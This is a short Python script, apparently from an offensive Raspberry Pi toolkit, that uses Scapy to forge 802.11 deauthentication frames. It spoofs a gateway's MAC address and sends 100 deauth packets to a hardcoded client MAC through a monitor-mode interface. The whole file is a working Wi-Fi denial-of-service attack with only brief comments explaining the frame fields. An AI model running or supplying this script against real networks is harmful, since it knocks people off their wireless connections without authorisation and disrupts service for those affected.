from scapy.all import *

from badberrypi.common import run_code

target_mac = "00:ae:fa:81:e2:5e"
gateway_mac = "e8:94:f6:c4:97:3f"
# 802.11 frame
# addr1: destination MAC
# addr2: source MAC
# addr3: Access Point MAC
dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
# stack them up
packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
# send the packet
sendp(packet, inter=0.1, count=100, iface="wlan0mon", verbose=1)
